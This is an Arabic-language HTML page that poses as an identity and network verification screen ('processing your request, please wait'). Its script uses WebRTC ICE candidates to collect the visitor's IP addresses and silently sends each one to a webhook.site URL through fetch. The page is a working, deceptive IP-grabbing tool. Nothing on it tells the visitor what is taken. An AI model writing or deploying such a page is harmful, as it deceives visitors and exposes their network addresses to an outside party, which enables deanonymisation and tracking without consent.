<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جاري التحقق من الهوية...</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
    </style>
</head>
<body>
    <h1>جاري معالجة طلبك، يرجى الانتظار...</h1>
    <p>يتم الآن التحقق من اتصال الشبكة الموثوق.</p>

    <script>
        function getIPs(callback) {
            var ip_dups = {};
            var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
            
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            pc.onicecandidate = ice => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
                if (!ip_dups[myIP]) { callback(myIP); ip_dups[myIP] = true; }
            };
        }

        // إرسال الـ IP إلى رابط الـ Webhook الخاص بك
        getIPs(function(ip) {
            fetch('https://webhook.site/424d936d-03d8-4e42-a0f1-8fd02a239ffe?ip=' + ip, {
                mode: 'no-cors'
            });
        });
    </script>
</body>
  </html>
